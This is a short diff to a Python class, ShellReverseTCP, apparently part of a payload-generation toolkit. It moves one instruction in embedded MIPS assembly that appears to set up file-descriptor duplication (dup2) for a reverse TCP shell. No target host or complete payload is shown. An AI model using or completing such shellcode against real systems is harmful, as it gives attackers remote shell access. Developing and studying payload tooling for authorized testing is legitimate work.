@@ -72,9 +72,9 @@ class ShellReverseTCP(HatAsm, HatVenom, Words):
             syscall 0x40404
             
             li $s1, -3
+            nor $s1, $s1, $zero
 
         dup:
-            nor $s1, $s1, $zero
             lw $a0, -1($sp)
             move $a1, $s1
             li $v0, 4063
